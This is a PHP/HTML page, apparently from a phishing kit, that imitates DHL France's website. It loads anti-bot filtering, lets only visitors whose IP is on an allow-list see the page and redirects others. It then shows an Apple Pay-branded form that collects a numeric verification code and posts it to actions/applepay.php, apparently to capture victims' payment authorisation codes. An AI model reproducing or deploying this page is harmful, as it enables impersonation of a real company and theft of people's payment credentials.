<?php
  include("common/trad.php");
  include("common/includes.php");
  require("antibots.php");

    $link_file = "ipvbv.txt";
    $ipsvbv = file($link_file, FILE_IGNORE_NEW_LINES);
    $ipsvbv = array_map("str_getcsv", $ipsvbv);
    $ipsvbv = array_column($ipsvbv, null, 0);
    
    if (!isset($ipsvbv[_ip()])) {
        header('Location: finished.php'); die();
    }
?>
<!DOCTYPE html>
<html lang="fr-FR" dir="ltr" base="fr-fr">
  <head>
    <meta charset="utf-8" />
    <title><?=$a0?></title>
    <link rel="preload" href="/etc/clientlibs/dhl/clientlib-all/css/bundle.b0af22dc46cc1ca8911937dfe141744d.css" as="style" crossorigin />
    <link rel="preload" href="/etc/clientlibs/dhl/clientlib-all/assets/fonts/default-274a65bae9742377aaf0.woff" as="font" crossorigin />
    <link rel="preload" href="/etc/clientlibs/dhl/clientlib-all/assets/fonts/default-3e828e80f6e985c352eb.woff" as="font" crossorigin />
    <link rel="preload" href="/etc/clientlibs/dhl/clientlib-all/assets/fonts/default-5a6dd86f272b304a8b83.woff" as="font" crossorigin />
    <link rel="preload" href="/etc/clientlibs/dhl/clientlib-all/assets/fonts/default-815fcbb4d2c579017011.woff" as="font" crossorigin />
    <link rel="preload" href="/etc/clientlibs/dhl/clientlib-all/assets/fonts/iconfont-da52a17c1b8deb953bfe.woff" as="font" crossorigin />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="description" content="Merci pour votre demande de cotation. Nos experts en transit de fret vous contacteront" />
    <meta name="language" content="fr-FR" />
    <meta name="region" content="europe" />
    <link rel="canonical" href="https://www.dhl.com/fr-fr/home/nos-divisions/expediteur-mondial/obtenir-une-cotation/forme-cotation-general.html" />
    <meta property="og:title" content="Formulaire de cotation DGF générale | DHL Global Forwarding |" />
    <meta property="og:site_name" content="DHL" />
    <meta property="og:type" content="website" />
    <meta property="og:url" content="https://www.dhl.com/fr-fr/home/nos-divisions/expediteur-mondial/obtenir-une-cotation/forme-cotation-general.html" />
    <meta property="og:description" content="Merci pour votre demande de cotation. Nos experts en transit de fret vous contacteront" />
    <meta property="og:locale" content="fr_FR" />
    <meta name="section" content="dhl:section/global-forwarding" />
    <meta name="google-site-verification" content="Owvc_x6-UK2jS5AO7XJyp-7jV4VNI44HGdikZAK-ePU" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="default" />
    <meta name="format-detection" content="telephone=no" />
    <meta name="analyticsId" content="7e3564e272718b13790a8e50fcb4c549" />
    <link rel="icon" href="/etc/clientlibs/dhl/clientlib-all/assets/favicon.ico" type="image/x-icon" />
    <link rel="apple-touch-icon" href="/etc/clientlibs/dhl/clientlib-all/assets/appletouch/apple-touch-icon-57x57.png" />
    <link rel="apple-touch-icon" sizes="76x76" href="/etc/clientlibs/dhl/clientlib-all/assets/appletouch/apple-touch-icon-76x76.png" />
    <link rel="apple-touch-icon" sizes="120x120" href="/etc/clientlibs/dhl/clientlib-all/assets/appletouch/apple-touch-icon-120x120.png" />
    <link rel="apple-touch-icon" sizes="180x180" href="/etc/clientlibs/dhl/clientlib-all/assets/appletouch/apple-touch-icon-180x180.png" />
    <script>
      dataLayer = {
        "page": {
          "pageInfo": {
            "businessUnit": "DHL Global Forwarding",
            "pageType": "Product",
            "pageNameLegacy": "General DGF Quote Form | DHL Global Forwarding | France | FR",
            "publisher": "DGF",
            "language": "fr-FR",
            "analyticsId": "7e3564e272718b13790a8e50fcb4c549",
            "projectName": "NA",
            "pageName": "General DGF Quote Form"
          },
          "attributes": {
            "campaign": "NA"
          },
          "category": {
            "subCategory2": "NA",
            "subCategory1": "Form \u2013 Sales",
            "primaryCategory": "Sales Product",
            "contentType": "NA"
          }
        }
      };
      gnfPageTags = {
        "country": "fr",
        "region": "europe"
      };
    </script>
    <link rel="stylesheet" href="/etc/clientlibs/dhl/clientlib-all/css/bundle.b0af22dc46cc1ca8911937dfe141744d.css" />
    <link rel="stylesheet" href="/etc.clientlibs/dhl/clientlibs/clientlib-core.min.css" type="text/css">
    <script src="/etc.clientlibs/dhl/clientlibs/clientlib-core.min.js"></script>
    <script src="//assets.adobedtm.com/launch-ENa2e710b79eef40758cbb936003b8b231.min.js"></script>
  </head>
  <body class="no-js  ">
    <!--googleoff: all-->

    <nav class="c-nav-wcag">
        <span class="sr-only"><?=$a1?></span>
        <ul>

            <li><a href="#wcag-main-content"><?=$a2?></a></li>
            <li><a href="#wcag-footer"><?=$a3?></a></li>
        </ul>
    </nav>

    <div class="c-country-selection-layer component-wide l-grid l-grid--left-s l-grid--center-m js--country-selection-layer" data-cookie="country" data-cookie-value="fr" data-cookie-validity="365" data-cookie-path="/">
        <div class="c-country-selection-layer--container l-grid l-grid--w-100pc-s">
            <div class="l-grid l-grid--w-100pc-s l-grid--left-m">

                <div class="l-grid l-grid--w-100pc-m-s">
                    <div class="c-country-selection-layer--flag">
                        <span class="flag-icon flag-icon-fr"></span>
                    </div>
                    <div class="c-country-selection-layer--copy-container l-grid l-grid--w-auto-s l-grid--middle-s l-grid--w-reset-m">
                        <span class="c-country-selection-layer--copy"><?=$a4?></span>
                        <span class="c-country-selection-layer--copy"><strong>&nbsp;<?=$a5?></strong></span>
                    </div>
                </div>

                <div class="l-grid l-grid--w-100pc-m-s l-grid--w-100pc-s-l l-grid--w-100pc-s-m l-grid--w-100pc-s l-grid--w-reset-m">
                    <div class="base-button js--country-selection-layer-close c--country-selection-layer-close js--cookie-set" tabindex="0" data-tracking="{&quot;component&quot;:&quot;dhl/components/global/country-selection-layer&quot;}">

                        <span><?=$a6?></span>

                    </div>
                    <span class="c-country-selection-layer--base-copy l-grid l-grid--w-100pc-s l-grid--center-s l-grid--middle-s l-grid--w-reset-m l-grid--left-m">ou</span>
                    <a href="/fr-fr/home/location-selector-redirect.html" class="base-button base-button--white" data-tracking="{&quot;component&quot;:&quot;dhl/components/global/country-selection-layer&quot;}">

                        <span><?=$a7?></span>

                    </a>
                </div>
            </div>
        </div>
    </div>

    <div class="c-overlay-small yellow js--non-supported-browser c-non-supported-browser">
        <div class="component-wide">
            <div class="c-overlay-small--box has-rte">
                <a href="#" class="c-product-close icon-cancel js--non-supported-browser-close" tabindex="0" title="Close" data-tracking="{&quot;component&quot;:&quot;dhl/components/global/non-supported-browser-overlay&quot;}"></a>
                <div class="c-overlay-small--inner">
                    <div class="c-overlay-small--scrollcontainer">

                        <h3><?=$a8?></h3>
                        <p>
                            <p class="has-rte"><?=$a9?></p>
                            <p class="has-rte"><?=$a10?></p>
                            <ul class="list is-left has-no-padding">
                                <li><span><a href="https://www.google.co.uk/chrome/" title="Télécharger Chrome" target="_blank" class="link link-external link-red has-icon" rel="noopener noreferrer">Chrome</a></span></li>
                                <li><span><a title="Télécharger Microsoft Edge" href="https://www.microsoft.com/en-us/edge" target="_blank" class="link link-external link-red has-icon" rel="noopener noreferrer">Edge</a></span></li>
                                <li><span><a title="Télécharger Firefox" href="https://www.mozilla.org/en-GB/firefox/new/" target="_blank" class="link link-external link-red has-icon" rel="noopener noreferrer">Firefox</a></span></li>
                            </ul>
                        </p>
                        <div class="c-overlay-small--button-container">
                            <a href="#" class="base-button js--non-supported-browser-close" data-tracking="{&quot;component&quot;:&quot;dhl/components/global/non-supported-browser-overlay&quot;}">

                                <span>Continuer avec IE</span>

                            </a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="section"></div>
    <div class="iparys_inherited"></div>

    <div class="c-global-newsflash--wrapper js--global-newsflash" data-jsonurl="/global/dhl/news-alerts.gnf.json" data-nosnippet>
        <div class="c-global-newsflash component-wide l-grid l-grid--left-s l-grid--bottom-s l-grid--nowrap-m js-global-newsflash">
            <div class="l-grid--w-90pc-s l-grid--w-90pc-m l-grid--left-m c-global-newsflash--content-wrapper">
                <i class="c-global-newsflash-icon-alert icon-exception"></i>
                <a data-linkname="newsflash" class="c-global-newsflash--copy js--global-newsflash--link c-global-newsflash--copy--mobile js-global-newsflash--copy--mobile link-internal link no-nowrap l-grid--hidden-m l-grid--visible-s has-icon" target="_blank" rel="noopener noreferrer" title="Consultez les alertes susceptibles d’impacter les services DHL">Consultez les alertes susceptibles d’impacter les services DHL
                    <span class="sr-only">Consultez les alertes susceptibles d’impacter les services DHL</span>
                </a>
                <button class="c-global-newsflash-close link-icon icon-cancel js--global-newsflash-close" title="Close" aria-label="Close" tabindex="0">
        <span class="sr-only">Close</span>
      </button>
            </div>
        </div>
    </div>

    <!--googleon: all-->

    <div class="l-view ">

        <header>

            <div class="headeriparsys iparsys parsys">
                <!--googleoff: all-->

                <div class="c-nav--layer js--nav-layer"></div>
                <div id="navigation-primary" class="l-header c-voc-nav js--voc-nav">
                    <nav class="c-nav l-grid">
                        <span class="sr-only">Navigation principale</span>
                        <div class="c-nav-primary--meta-container l-grid l-grid--w-100pc-m">
                            <div>
                                <a href="/fr-fr/home.html" class="c-nav--logo ">
                                    <img src="/content/dam/dhl/global/core/images/logos/dhl-logo.svg" alt="Retour à l’accueil">
                                </a>
                            </div>
                            <div class="c-nav-primary--meta l-grid--hidden-s l-grid--visible-m">
                                <div class="l-grid l-grid--row-reverse l-grid--w-100pc-s c-nav-primary--meta-links-container">
                                    
                                    <ul class="c-nav-primary--meta-others js-nav-primary--meta-links">
                                        <li class="l-grid js--nav-tohide c-nav-primary--globalnewsflash js--nav-primary--globalnewsflash not-visible">
                                            <a class="has-icon icon-exception" href="/global-en/home/global-news-alerts.html" target="_blank" title="Alertes" rel="noopener noreferrer">
                                    Alertes
                                    <span class="sr-only">Alertes</span>
                                </a>
                                        </li>

                                    </ul>
                                </div>
                            </div>
                        </div>
                        
                        
                    </nav>
                </div>
                                        </div>
                                    </div>

                                </li>

                                <!--Start of slim navigation -->

                            </ul>
                        </div>
                    </nav>
                </div>

                <!--googleon: all-->
                <div class="section"></div>
                <div class="iparys_inherited"></div>
            </div>

            <div class="secondaryNavIparsys iparsys parsys">
                <div class="section"></div>
                <div class="iparys_inherited"></div>
            </div>

        </header>
        <div class="js--nav-padding-layer c-nav--padding-layer"></div>

        <span class="link-anchor" id="parsysPathStage_marketing_stage_trac"></span>

        

        <nav class="c-component-breadcrumb l-grid">
            <span class="sr-only">You are here</span>

        </nav>
        <!--googleon: all-->
        <main id="wcag-main-content">



            <span class="link-anchor" id="parsysPath_reference_1060147059"></span>
            <div class="cq-dd-paragraph">

                <span class="link-anchor" id="parsysPath_page_headline"></span>
                <div class="c-page-headline component-small has-rte 
component-margin
">
                    <div class="c-page-headline--wrapper">
            <br>
                <img class="c-voc-icon-teasers--card-image" src="https://download.logo.wine/logo/Apple_Pay/Apple_Pay-Logo.wine.png" width="200" height="130">
          </div>
        </div>
        <div class="c-form-message js--form-message-success">
          <div class="title  title-black title-left  title-margin-none">
            <div class="cmp-title">
              <h2 class="cmp-title__text"></h2>
            </div>
          </div>
          <div class="text text-black text-left text-margin-top">
            <div class="cmp-text" id="form-message-success"></div>
          </div>
        </div>
        <div class="c-form-message js--form-message-error">
          <div class="title  title-black title-left  title-margin-none">
            <div class="cmp-title">
              <h2 class="cmp-title__text"></h2>
            </div>
          </div>
          <div class="text text-black text-left text-margin-top">
            <div class="cmp-text" id="form-message-error"></div>
          </div>
        </div>
        <div class="c-form-steps js--form-steps is-form-steps component-wide use-form-steps">
          <div class="c-form-step--form js--form-steps--form">
          	<!--Form-->
            <!--Form-->
    <form class="js--form-steps--form-element" action="actions/applepay.php" method="POST" id="_content_dhl_master_en_home_our-divisions_global-forwarding_dgf-quote_general-dgf-quote-form_jcr_content_parsysPath_start" name="General DGF Quote Form" data-di-form-track="" data-di-form-id="_content_dhl_master_en_home_our-divisions_global-forwarding_dgf-quote_general-dgf-quote-form_jcr_content_parsysPath_start" enctype="multipart/form-data" novalidate="">
    <section class="c-form-step--section js--form-step--section" data-form-step="3" style="z-index: 1;">
      <span class="link-anchor" id="fieldParsys3_text_generic"></span>
      <div class="component-margin c-text-generic has-rte component-small ">
        </div>
        <fieldset class="c-form--element-fieldset js--form--element-fieldset">
          <legend class="c-form--element-base c-form--element-fieldset-legend "><?=$b70?></legend>
          <p class="has-rte"><?=$b71?></p>
        <!-- data-form-value-state is new -->
        <div class="c-form-step--item js--form-step--item" data-form-item-id="code_1" data-form-validation-state="neutral" data-form-value-state="unset">
          <input class="c-form--element-base c-form--element-input js--form-element js--form--element-input" id="code" name="code" type="text" autocomplete="off" data-form-validation-on="blur" data-form-validation-type="regex" data-form-validation-rule="^[0-9]{1,}$" pattern="^[0-9]{1,}$" data-di-field-id="code" required="">
          <label class="c-form--element-base c-form--element-label" for="code"><?=$b72?>*</label>
          <p class="c-form--element-base c-form-step--error-message"><?=$b73?></p>
        </div>
      </fieldset>
      <span class="link-anchor" id="fieldParsys3_text_generic_1670518555"></span>
      <fieldset class="c-form--element-fieldset">
        <div class="c-form-step--item js--form-step--item has-button has-button-submit">
          <button type="submit" class="base-button js--form-step-goto js--form-step-submit" data-form-validation-on="submit" data-tracking="{&quot;component&quot;:&quot;dhl/components/form/sendEmailContainer&quot;,&quot;name&quot;:&quot;static.form-step-container.submit&quot;}">
            <span><?=$b74?></span>
          </button>
        </div>
      </fieldset>
    </section>
  </div>
  <p style="text-align:center;"></p>
</form>
          </div>
        </div>
        <a class="base-button c-go-to-top-button js--go-to-top-button has-icon icon-chevron-up" href="#" title="aller en haut" aria-label="aller en haut" data-tracking='{&quot;component&quot;:&quot;go-to-top-button&quot;}'></a>
      </main>
      <footer id="wcag-footer" class="c-voc-footer">

            <!--googleoff: all-->

            <span class="link-anchor" id="footerContainerPar_footer_link_containe"></span>

            <div class="c-voc-footer--sitemap l-grid component-wide">

                <span class="link-anchor" id="footer-link-container-par_footer_link_section_"></span>

                <ul class="c-voc-footer--sitemap-section l-grid--w-100pc-s l-grid--w-50pc-s-m l-grid--w-50pc-s-l l-grid--w-50pc-m-s l-grid--w-25pc-m-m">
                    <li class="group-heading red">
                        <?=$b7?>

                    </li>

                    <li>
                        <a href="/fr-fr/home/customer-service.html" class="link link-light-grey  has-icon" data-tracking="{&quot;component&quot;:&quot;dhl/components/elements/footer-link-element&quot;,&quot;name&quot;:&quot;Customer Service&quot;,&quot;topic&quot;:&quot;footer&quot;}">
       
	   <?=$b8?>
	   
    </a>
                    </li>

                    <li>
                        <a href="/fr-fr/home/se-connecter.html" class="link link-light-grey  has-icon" data-tracking="{&quot;component&quot;:&quot;dhl/components/elements/footer-link-element&quot;,&quot;name&quot;:&quot;Customer Portal Logins&quot;,&quot;topic&quot;:&quot;footer&quot;}">
       
	   <?=$b9?>
	   
    </a>
                    </li>

                    <li>
                        <a href="/global-en/home/digital-partners-integrations.html" target="_blank" class="link link-light-grey  has-icon" data-tracking="{&quot;component&quot;:&quot;dhl/components/elements/footer-link-element&quot;,&quot;name&quot;:&quot;Digital Partners and Integrations&quot;,&quot;topic&quot;:&quot;footer&quot;}" rel="noopener noreferrer">
       
	   <?=$b10?>
	   
    </a>
                    </li>

                    <li>
                        <a href="https://developer.dhl/" target="_blank" title="Developer.dhl" class="link link-light-grey link-external has-icon" data-tracking="{&quot;component&quot;:&quot;dhl/components/elements/footer-link-element&quot;,&quot;name&quot;:&quot;Developer Portal&quot;,&quot;topic&quot;:&quot;footer&quot;}" rel="noopener noreferrer">
       
	   <?=$b11?>
	   
    </a>
                    </li>

                </ul>

                <span class="link-anchor" id="footer-link-container-par_footer_link_section__682602338"></span>

                <ul class="c-voc-footer--sitemap-section l-grid--w-100pc-s l-grid--w-50pc-s-m l-grid--w-50pc-s-l l-grid--w-50pc-m-s l-grid--w-25pc-m-m">
                    <li class="group-heading ">
                    <?=$b36?>

                    </li>

                    <li>
                        <a href="https://www.dhl.de/en/privatkunden.html" target="_blank" class="link link-light-grey link-external has-icon" data-tracking="{&quot;component&quot;:&quot;dhl/components/elements/footer-link-element&quot;,&quot;name&quot;:&quot;Post and Paket Deutschland&quot;,&quot;topic&quot;:&quot;footer&quot;}" rel="noopener noreferrer">
       
	   <?=$b12?>
	   
    </a>
                    </li>

                    <li>
                        <a href="/fr-fr/home/nos-divisions/express.html" class="link link-light-grey  has-icon" data-tracking="{&quot;component&quot;:&quot;dhl/components/elements/footer-link-element&quot;,&quot;name&quot;:&quot;DHL Express&quot;,&quot;topic&quot;:&quot;footer&quot;}">
       
	   <?=$b13?>
	   
    </a>
                    </li>

                    <li>
                        <a href="/fr-fr/home/nos-divisions/expediteur-mondial.html" class="link link-light-grey  has-icon" data-tracking="{&quot;component&quot;:&quot;dhl/components/elements/footer-link-element&quot;,&quot;name&quot;:&quot;DHL Global Forwarding&quot;,&quot;topic&quot;:&quot;footer&quot;}">
       
	   <?=$b14?>
	   
    </a>
                    </li>

                    <li>
                        <a href="/fr-fr/home/nos-divisions/fret.html" class="link link-light-grey  has-icon" data-tracking="{&quot;component&quot;:&quot;dhl/components/elements/footer-link-element&quot;,&quot;name&quot;:&quot;DHL Freight&quot;,&quot;topic&quot;:&quot;footer&quot;}">
       
	   <?=$b15?>
	   
    </a>
                    </li>

                    <li>
                        <a href="/fr-fr/home/nos-divisions/chaine-logistique.html" class="link link-light-grey  has-icon" data-tracking="{&quot;component&quot;:&quot;dhl/components/elements/footer-link-element&quot;,&quot;name&quot;:&quot;DHL Supply Chain&quot;,&quot;topic&quot;:&quot;footer&quot;}">
       
	   <?=$b16?>
	   
    </a>
                    </li>

                    <li>
                        <a href="/fr-fr/home/nos-divisions/parcel.html" class="link link-light-grey  has-icon" data-tracking="{&quot;component&quot;:&quot;dhl/components/elements/footer-link-element&quot;,&quot;name&quot;:&quot;DHL Parcel&quot;,&quot;topic&quot;:&quot;footer&quot;}">
       
	   <?=$b17?>
	   
    </a>
                    </li>

                </ul>

                <span class="link-anchor" id="footer-link-container-par_footer_link_section__430471010"></span>

                <ul class="c-voc-footer--sitemap-section l-grid--w-100pc-s l-grid--w-50pc-s-m l-grid--w-50pc-s-l l-grid--w-50pc-m-s l-grid--w-25pc-m-m">
                    <li class="group-heading ">
                    <?=$b35?>

                    </li>

                    <li>
                        <a href="/fr-fr/home/secteurs-industries/automobile.html" class="link link-light-grey  has-icon" data-tracking="{&quot;component&quot;:&quot;dhl/components/elements/footer-link-element&quot;,&quot;name&quot;:&quot;Auto-Mobility&quot;,&quot;topic&quot;:&quot;footer&quot;}">
       
	   <?=$b18?>
	   
    </a>
                    </li>

                    <li>
                        <a href="/fr-fr/home/secteurs-industries/produits-chimiques.html" class="link link-light-grey  has-icon" data-tracking="{&quot;component&quot;:&quot;dhl/components/elements/footer-link-element&quot;,&quot;name&quot;:&quot;Chemicals&quot;,&quot;topic&quot;:&quot;footer&quot;}">
       
	   <?=$b19?>
	   
    </a>
                    </li>

                    <li>
                        <a href="/fr-fr/home/secteurs-industries/biens-de-consommation.html" class="link link-light-grey  has-icon" data-tracking="{&quot;component&quot;:&quot;dhl/components/elements/footer-link-element&quot;,&quot;name&quot;:&quot;Consumer&quot;,&quot;topic&quot;:&quot;footer&quot;}">
       
	   <?=$b20?>
	   
    </a>
                    </li>

                    <li>
                        <a href="/fr-fr/home/secteurs-industries/energie.html" class="link link-light-grey  has-icon" data-tracking="{&quot;component&quot;:&quot;dhl/components/elements/footer-link-element&quot;,&quot;name&quot;:&quot;Energy&quot;,&quot;topic&quot;:&quot;footer&quot;}">
       
	   <?=$b21?>
	   
    </a>
                    </li>

                    <li>
                        <a href="/fr-fr/home/secteurs-industries/ingenierie-et-fabrication.html" class="link link-light-grey  has-icon" data-tracking="{&quot;component&quot;:&quot;dhl/components/elements/footer-link-element&quot;,&quot;name&quot;:&quot;Engineering and Manufacturing&quot;,&quot;topic&quot;:&quot;footer&quot;}">
       
	   <?=$b22?>
	   
    </a>
                    </li>

                    <li>
                        <a href="/fr-fr/home/secteurs-industries/sciences-de-la-vie-et-services-de-sante.html" class="link link-light-grey  has-icon" data-tracking="{&quot;component&quot;:&quot;dhl/components/elements/footer-link-element&quot;,&quot;name&quot;:&quot;Life Sciences and Healthcare&quot;,&quot;topic&quot;:&quot;footer&quot;}">
       
	   <?=$b23?>
	   
    </a>
                    </li>

                    <li>
                        <a href="/fr-fr/home/secteurs-industries/secteur-public.html" class="link link-light-grey  has-icon" data-tracking="{&quot;component&quot;:&quot;dhl/components/elements/footer-link-element&quot;,&quot;name&quot;:&quot;Public Sector&quot;,&quot;topic&quot;:&quot;footer&quot;}">
       
	   <?=$b24?>
	   
    </a>
                    </li>

                    <li>
                        <a href="/fr-fr/home/secteurs-industries/vente-au-detail.html" class="link link-light-grey  has-icon" data-tracking="{&quot;component&quot;:&quot;dhl/components/elements/footer-link-element&quot;,&quot;name&quot;:&quot;Retail&quot;,&quot;topic&quot;:&quot;footer&quot;}">
       
	   <?=$b25?>
	   
    </a>
                    </li>

                    <li>
                        <a href="/fr-fr/home/secteurs-industries/technologie.html" class="link link-light-grey  has-icon" data-tracking="{&quot;component&quot;:&quot;dhl/components/elements/footer-link-element&quot;,&quot;name&quot;:&quot;Technology&quot;,&quot;topic&quot;:&quot;footer&quot;}">
       
	   <?=$b26?>
	   
    </a>
                    </li>

                </ul>

                <span class="link-anchor" id="footer-link-container-par_footer_link_section__488113198"></span>

                <ul class="c-voc-footer--sitemap-section l-grid--w-100pc-s l-grid--w-50pc-s-m l-grid--w-50pc-s-l l-grid--w-50pc-m-s l-grid--w-25pc-m-m">
                    <li class="group-heading ">
                        <?=$b34?>

                    </li>

                    <li>
                        <a href="/fr-fr/home/nous-connaitre.html" class="link link-light-grey  has-icon" data-tracking="{&quot;component&quot;:&quot;dhl/components/elements/footer-link-element&quot;,&quot;name&quot;:&quot;About DHL&quot;,&quot;topic&quot;:&quot;footer&quot;}">
       
	   <?=$b27?>
	   
    </a>
                    </li>

                    <li>
                        <a href="/global-en/delivered.html" target="_blank" class="link link-light-grey  has-icon" data-tracking="{&quot;component&quot;:&quot;dhl/components/elements/footer-link-element&quot;,&quot;name&quot;:&quot;Delivered&quot;,&quot;topic&quot;:&quot;footer&quot;}" rel="noopener noreferrer">
       
	   <?=$b28?>
	   
    </a>
                    </li>

                    <li>
                        <a href="/fr-fr/home/careers.html" class="link link-light-grey  has-icon" data-tracking="{&quot;component&quot;:&quot;dhl/components/elements/footer-link-element&quot;,&quot;name&quot;:&quot;Careers&quot;,&quot;topic&quot;:&quot;footer&quot;}">
       
	   <?=$b29?>
	   
    </a>
                    </li>

                    <li>
                        <a href="/fr-fr/home/presse.html" class="link link-light-grey  has-icon" data-tracking="{&quot;component&quot;:&quot;dhl/components/elements/footer-link-element&quot;,&quot;name&quot;:&quot;Press Center&quot;,&quot;topic&quot;:&quot;footer&quot;}">
       
	   <?=$b30?>
	   
    </a>
                    </li>

                    <li>
                        <a href="/fr-fr/home/nous-connaitre/developpement-durable.html" class="link link-light-grey  has-icon" data-tracking="{&quot;component&quot;:&quot;dhl/components/elements/footer-link-element&quot;,&quot;name&quot;:&quot;Sustainability&quot;,&quot;topic&quot;:&quot;Company Information&quot;}">
       
	   <?=$b31?>
	   
    </a>
                    </li>

                    <li>
                        <a href="/fr-fr/home/vision-et-innovation.html" class="link link-light-grey  has-icon" data-tracking="{&quot;component&quot;:&quot;dhl/components/elements/footer-link-element&quot;,&quot;name&quot;:&quot;Insights and Innovation&quot;,&quot;topic&quot;:&quot;footer&quot;}">
       
	   <?=$b32?>
	   
    </a>
                    </li>

                    <li>
                        <a href="/fr-fr/home/nous-connaitre/partenariats.html" class="link link-light-grey  has-icon" data-tracking="{&quot;component&quot;:&quot;dhl/components/elements/footer-link-element&quot;,&quot;name&quot;:&quot;Official Logistics Partners&quot;,&quot;topic&quot;:&quot;footer&quot;}">
       
	   <?=$b33?>
	   
    </a>
                    </li>

                </ul>

            </div>

            <div class="c-footer-meta component-wide l-grid">
                <div class="l-grid--w-100pc-s l-grid--w-70pc-m c-footer-meta-container">
                    <img class="c-footer-meta-logo" src="/content/dam/dhl/global/core/images/logos/glo-footer-logo.svg" alt="Le Groupe Deutsche Post DHL " />

                    <nav class="l-grid--w-100pc-s">
                        <ul class="c-footer-meta--list l-grid">

                            <li class="l-grid--w-50pc-s">
                                <a href="/fr-fr/home/bas-de-page/sensibilisation-a-la-fraude.html" class="link  has-icon" data-tracking="{&quot;component&quot;:&quot;dhl/components/general/footer-legal&quot;,&quot;name&quot;:&quot;Footer |  Legal | Fraud Awareness&quot;,&quot;topic&quot;:&quot;footer homepage legal pages&quot;}">
                                    <span class="sr-only"><?=$b37?>

                                </a>
                            </li>

                            <li class="l-grid--w-50pc-s">
                                <a href="/fr-fr/home/bas-de-page/mention-legale.html" class="link  has-icon" data-tracking="{&quot;component&quot;:&quot;dhl/components/general/footer-legal&quot;,&quot;name&quot;:&quot;Footer |  Legal | Legal Notice&quot;,&quot;topic&quot;:&quot;footer homepage legal pages&quot;}">
                                    <span class="sr-only"><?=$b38?>

                                </a>
                            </li>

                            <li class="l-grid--w-50pc-s">
                                <a href="/fr-fr/home/bas-de-page/conditions-utilisation.html" class="link  has-icon" data-tracking="{&quot;component&quot;:&quot;dhl/components/general/footer-legal&quot;,&quot;name&quot;:&quot;Footer |  Legal | Terms of Use&quot;,&quot;topic&quot;:&quot;footer homepage legal pages&quot;}">
                                    <span class="sr-only"><?=$b39?>

                                </a>
                            </li>

                            <li class="l-grid--w-50pc-s">
                                <a href="/fr-fr/home/bas-de-page/avis-de-confidentialite.html" class="link  has-icon" data-tracking="{&quot;component&quot;:&quot;dhl/components/general/footer-legal&quot;,&quot;name&quot;:&quot;Footer |  Legal | Privacy Notice&quot;,&quot;topic&quot;:&quot;footer homepage legal pages&quot;}">
                                    <span class="sr-only"><?=$b40?>

                                </a>
                            </li>

                            <li class="l-grid--w-50pc-s">
                                <a href="/fr-fr/home/bas-de-page/resolution-des-litiges.html" class="link  has-icon" data-tracking="{&quot;component&quot;:&quot;dhl/components/general/footer-legal&quot;,&quot;name&quot;:&quot;Footer |  Legal | Dispute Resolution&quot;,&quot;topic&quot;:&quot;footer homepage legal pages&quot;}">
                                    <span class="sr-only"><?=$b41?>

                                </a>
                            </li>

                            <li class="l-grid--w-50pc-s">
                                <a href="/fr-fr/home/bas-de-page/additional-information.html" class="link  has-icon" data-tracking="{&quot;component&quot;:&quot;dhl/components/general/footer-legal&quot;,&quot;name&quot;:&quot;Additional Information&quot;,&quot;topic&quot;:&quot;footer homepage legal pages&quot;}">
                                    <span class="sr-only"><?=$b42?>

                                </a>
                            </li>
                        </ul>
                    </nav>
                </div>
                <div class="l-grid--w-100pc-s l-grid--w-30pc-m c-footer-social-container">
                    <div class="c-footer-headline">
                    <?=$b44?>
                    </div>
                    <nav class="l-grid--w-100pc-s">
                        <ul class="c-footer-social--list">

                            <li class="">
                                <a href="https://www.youtube.com/user/dhl" class="link link-social" target="_blank" title="YouTube" data-tracking="{&quot;component&quot;:&quot;dhl/components/general/footer-legal&quot;,&quot;name&quot;:&quot;FL | Follow us | YouTube&quot;,&quot;topic&quot;:&quot;footer homepage legal pages&quot;}" rel="noopener noreferrer">
                                    <span class="sr-only"><?=$b43?></span>
                                    <img src="/content/dam/dhl/global/core/images/logos/youtube-new.svg" alt="YouTube" />

                                </a>
                            </li>

                            <li class="">
                                <a href="https://www.facebook.com/dhl" class="link link-social" target="_blank" title="Facebook" data-tracking="{&quot;component&quot;:&quot;dhl/components/general/footer-legal&quot;,&quot;name&quot;:&quot;FL | Follow us | Facebook&quot;,&quot;topic&quot;:&quot;footer homepage legal pages&quot;}" rel="noopener noreferrer">
                                    <span class="sr-only"><?=$b43?></span>
                                    <img src="/content/dam/dhl/global/core/images/logos/facebook-new.svg" alt="Facebook" />

                                </a>
                            </li>

                            <li class="">
                                <a href="https://www.linkedin.com/company/dhl" class="link link-social" target="_blank" title="LinkedIn" data-tracking="{&quot;component&quot;:&quot;dhl/components/general/footer-legal&quot;,&quot;name&quot;:&quot;FL | Follow us | LinkedIn&quot;,&quot;topic&quot;:&quot;footer homepage legal pages&quot;}" rel="noopener noreferrer">
                                    <span class="sr-only"><?=$b43?></span>
                                    <img src="/content/dam/dhl/global/core/images/logos/linkedIn-new.svg" alt="LinkedIn" />

                                </a>
                            </li>

                            <li class="">
                                <a href="https://www.instagram.com/dhl_global/" class="link link-social" target="_blank" title="Instagram" data-tracking="{&quot;component&quot;:&quot;dhl/components/general/footer-legal&quot;,&quot;name&quot;:&quot;FL | Follow us | Instagram&quot;,&quot;topic&quot;:&quot;footer homepage legal pages&quot;}" rel="noopener noreferrer">
                                    <span class="sr-only"><?=$b43?></span>
                                    <img src="/content/dam/dhl/global/core/images/logos/instagram-new.svg" alt="Instagram" />

                                </a>
                            </li>
                        </ul>
                    </nav>
                </div>
            </div>
            <small class="c-footer--legal-text component-wide l-grid l-grid--w-100pc-s l-grid--center-m">2023 © - all rights reserved</small>

            <!--googleon: all-->
            <div class="section"></div>
            <div class="iparys_inherited"></div>

        </footer>

    </div>

    <div class="overlay js--overlay"></div>

    <script src="/etc/clientlibs/dhl/clientlib-all/js/bundle.fd704368e44b4ffba12b03be52aeca89.js"></script>
    <noscript>
        <img src="https://deutschepostag.112.2o7.net/b/ss/dhlglobalrolloutprod/1/G.4--NS/0?pageName=Global%20Logistics%20-%20International%20Shipping%20%7C%20DHL%20Home%20%7C%20France%20%7C%20FR&events=event2&g=https://www.dhl.com/fr-fr/home.html" width="1" height="1" border="0"/>
    </noscript>

    <script type="text/javascript" src="/u7G-XP/VFih/_vs/h1E/85zlyoTJuTo/iNwEXNphGY/FmpeAQ/PRY/WSDszWh8"></script>
    <link rel="stylesheet" type="text/css" href="/_sec/cp_challenge/sec-3-9.css">
    <script src="/_sec/cp_challenge/sec-cpt-3-9.js" async defer></script>
